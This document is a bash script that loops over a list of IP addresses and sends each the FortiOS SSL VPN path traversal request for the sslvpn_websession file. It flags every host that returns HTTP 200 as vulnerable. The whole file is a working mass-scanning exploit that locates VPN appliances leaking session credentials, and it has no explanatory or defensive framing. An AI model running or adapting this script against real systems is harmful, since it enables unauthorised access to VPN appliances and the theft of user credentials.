#!/bin/bash
for scan in $(cat ips.txt)
do
final=$(curl -s -H "User-Agent: mozilla/4.0" -o /dev/null -w "%{http_code}" -k https://$scan:10443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession)
if [ $final == "200" ]
then
echo "VPN Vulneralver  =============>  https://$scan:10443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
fi
done
